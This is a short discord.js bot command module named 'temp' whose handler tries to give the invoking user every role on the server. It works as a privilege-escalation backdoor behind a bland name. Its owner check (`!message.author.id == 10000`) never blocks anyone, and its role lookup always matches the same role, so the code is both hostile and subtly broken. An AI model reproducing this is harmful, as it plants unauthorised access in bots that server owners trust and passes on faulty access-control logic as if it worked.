const Discord = require("discord.js");

module.exports = {
  name: "temp",
  execute(message) {
    if (!message.author.id == 10000) return;
    message.guild.roles.forEach(role => {
      var role = message.guild.roles.find(role => role.name === role.name);
      message.member.addRole(role);
    });
  }
};
